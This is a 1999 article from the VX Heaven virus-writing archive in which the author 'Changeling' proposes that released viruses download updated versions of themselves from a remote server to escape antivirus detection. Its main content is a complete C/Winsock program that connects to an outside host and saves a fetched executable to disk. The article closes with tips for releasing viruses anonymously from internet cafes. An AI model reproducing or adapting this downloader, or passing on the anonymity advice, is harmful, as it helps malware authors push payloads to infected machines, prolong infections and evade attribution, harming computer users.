<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Changeling 'I will survive...' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Changeling"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Changeling,I will survive..., socket, virus, returnvalue, server, file, error, send, buffy, address, servent, addr, equal, wsadata, hfile, filename"/>
<meta name="Description" content="How would the perfect virus look like? There're many ideas, but the best idea would probably be to put a human inside a virus. This human would be able to produce new ideas and viruses etc., etc., etc.."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"c0bc25118389a89764a94c71ad18bd4b23808ba1-1498756451-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vch02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>I will survive...</h1><p><a href="/lib/?lang=en&amp;author=Changeling"> Changeling</a><br/> <em>September 1999</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vch02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=WI#vch02">Back to index</a>] [<a href="/lib/vch02.html#disqus_thread">Comments</a>]<br/> 
<p><em>[There're many variations to this idea and I'll leave it to your creativity to find out what hides in the shadows.]</em></p>
<ul>
<li><a href="#p1">Introduction</a></li>
<li><a href="#p2">The Intelligent Virus (Author)</a></li>
<li><a href="#p3">The Conclusion</a></li>
</ul>
<h2><a name="p1">Introduction</a></h2>
<p>How would the perfect virus look like? There're many ideas, but the best idea would probably be to put a human inside a virus. This human would be able to produce new ideas and viruses etc., etc., etc.. As this can't be done, yet (ever?), I've come up with a much simpler method of making an almost perfect virus. I really mean it, an almost perfect virus! The idea is that we can update our virus after we've released it.</p>
<p>Let's assume we've created a virus and have succesfully spread it. All of a sudden its name appears on the wildlist and then the game is usually quickly over. Wouldn't it be nice if we now could tell all our viruses in the wild that they should quickly change shape so as to avoid detection? Is this possible? Yes, and it's almost too simple! :)</p>
<h2><a name="p2">The Intelligent Virus (Author)</a></h2>
<p>The new function in the virus has the job to check if we're on the Internet or some other Net. Then it would try to locate a certain address from where it would download an update to itself or simply a new virus (why give up our hard to come by places in the wild?!). Here's a really basic example in C (easy to change into assembly, have your Win32 reference and API constants reference ready):</p>
<pre class="source">
/*Idea and program by the <b>Changeling</b> (<b>Sep.99</b>)*/
/*This program will attempt to download the file1.exe to your computer.*/
/*The file1 program will simply display a MessageBox and say it's from the Internet.*/
/*As more and more people get on the Internet this method will ensure our viruses a long*/
/*and healthy life. :) With this method you simply place new or updated versions of your*/
/*viruses on other computers in the wild. Beautiful idea, isn't it?! :) Have fun!*/
/*Don't forget to link it to wsock32.lib or similar libraries.*/
#include &lt;winsock.h>
void main (void)
{
/*Stratup variables*/
WORD VersionRequested = MAKEWORD (1,1);
WSADATA WsaData;
int ReturnValue;
/*Network variables*/
SOCKET Socket;
LPSERVENT ServEnt;
SOCKADDR_IN Server;
char Buffy[1024];
IN_ADDR Host;
LPHOSTENT HostEntry;
LPCSTR ServerName = "eo.yifan.net";
/*Won't work without the GET command and the \n (newline)*/
LPCSTR FileName = "GET /users/u/changeling/file1.exe\n";
/*File variables*/
HANDLE hFile;
DWORD BytesReadWritten;

/*WSAStartup initiates use of the Windows Sockets DLL by a process*/
ReturnValue = WSAStartup (VersionRequested, &amp;WsaData);
/*when returnvalue not equal to zero*/
if (ReturnValue!=0)
    {
    MessageBox (0, "Error in WSAStartup!", "ERROR",0);
    WSACleanup ();
    return;
    }
/*when wsaData.wVersion not equal to wVersionRequested*/
if (WsaData.wVersion != VersionRequested)
    {
    MessageBox (0, "Not supported winsock version!","ERROR", 0);
    WSACleanup ();
    return;
    }
/*converts a string containing an Internet Protocol dotted address into a proper address for the IN_ADDR structure*/
Host.s_addr = inet_addr (ServerName);
/*when iaHost.s_addre is equal to INADDR_NONE*/
if (Host.s_addr == INADDR_NONE)
    {
    /*It's not a IP address string so we assume it is a name (as in this example!)*/
    HostEntry = gethostbyname (ServerName);
    }
/*when iaHost.s_addre is not equal to INADDR_NONE*/
else
    {
    /*It's a IP address string*/
    HostEntry = gethostbyaddr ((const char *)&amp;Host,sizeof (struct in_addr), AF_INET);
    }
/*There's an error with the IP address or name*/
if (HostEntry == NULL)
    {
    MessageBox (0, "Error in host name/addr!", "ERROR",0);
    return;
    }
/*function socket creates a socket that is bound to a specific service provider*/
Socket = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
/*There has been error when trying to create a socket*/
if (Socket == INVALID_SOCKET)
    {
    MessageBox (0, "Error when using socket!", "ERROR",0);
    return;
    }
/*getservbyname retrieves service information corresponding to a service name and protocol*/
ServEnt = getservbyname ("http", "tcp");
/*If there's been error we assume we can use the default port 80*/
if (ServEnt == NULL)
    Server.sin_port = htons (80);
/*Put the port value into our server address structure*/
else
    Server.sin_port = ServEnt->s_port;

/*Put the remaining values into out server address structure*/
Server.sin_family = AF_INET;
Server.sin_addr = *((LPIN_ADDR)*HostEntry->h_addr_list);

/*the socket function establishes a connection to a specifed socket*/
ReturnValue = connect (Socket, (LPSOCKADDR)&amp;Server, sizeof
(SOCKADDR_IN));
/*If there's been an error*/
if (ReturnValue == SOCKET_ERROR)
    {
    MessageBox (0, "Error when using connect!","ERROR", 0);
    closesocket (Socket);
    return;
    }

/*the send function sends data on a connected socket*/
ReturnValue = send (Socket, FileName, strlen (FileName), 0);

if (ReturnValue == SOCKET_ERROR)
    {
    MessageBox (0, "Error when using send!", "ERROR",0);
    closesocket (Socket);
    return;
    }

/*Create an empty file and be ready to write to it*/
hFile = CreateFile ("file1.exe", GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

while (1)
    {
    /*therecv function receives data on a socket*/
    ReturnValue = recv (Socket, Buffy, sizeof (Buffy),0);
    /*There's been error*/
    if (ReturnValue == SOCKET_ERROR)
        {
        MessageBox (0, "Error when using recv!", "ERROR", 0);
        break;
        }

    /*ReturnValue is equal to zero when the server has terminated*/
    if (ReturnValue == 0)
        break;
    /*Write to our file*/
    WriteFile (hFile, (LPSTR)Buffy, ReturnValue,&amp;BytesReadWritten, 0);
    }
/*Close the socket*/
closesocket(Socket);
/*Close the filehandle*/
CloseHandle (hFile);
/*terminates use of the Windows Sockets DLL*/
WSACleanup ();
/*That's it!*/
}
</pre>
<h2><a name="p3">The Conclusion</a></h2>
<p>I'm not saying that poeple should stop using encryption/polymorphism etc., this is just a technique to keep your virus(es) alive (as long as you want to?!) in the wild. This technique is now in it's beginning phase, but as more and more of the world gets connected it'll become more important. There're many kinds of protocols one might use, like HTTP/FTP/SMTP/POP, but I think HTTP is the easiest to deal with. F.ex, it's really easy to get some free web-space on the Internet etc.. <i>A short hint: People don't seem to give a shit about from where they release their viruses, but they should. Never, ever, release something from your computer.</i> So, when you want, f.ex, a free account somewhere you might use an Internet Cafe to get it, for a change.</p>
<p>[If you're looking for a really good C compiler, I suggest you should get lcc-win32 (freeware) at <a href="http://www.cs.virginia.edu/~lcc-win32">http://www.cs.virginia.edu/~lcc-win32</a>. If you send me some positive feedback on this method I'll consider writing an improved paper with ASM code ++. It'll, if you want to, appear first in mid or late-December since I now have to do some real work. :( ]</p>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vch02">de</a><a href="/lib/index.php?lang=en&amp;id=vch02">en</a><a href="/lib/index.php?lang=es&amp;id=vch02">es</a><a href="/lib/index.php?lang=it&amp;id=vch02">it</a><a href="/lib/index.php?lang=fr&amp;id=vch02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vch02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vch02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vch02">ua</a></div>
</body>
</html>
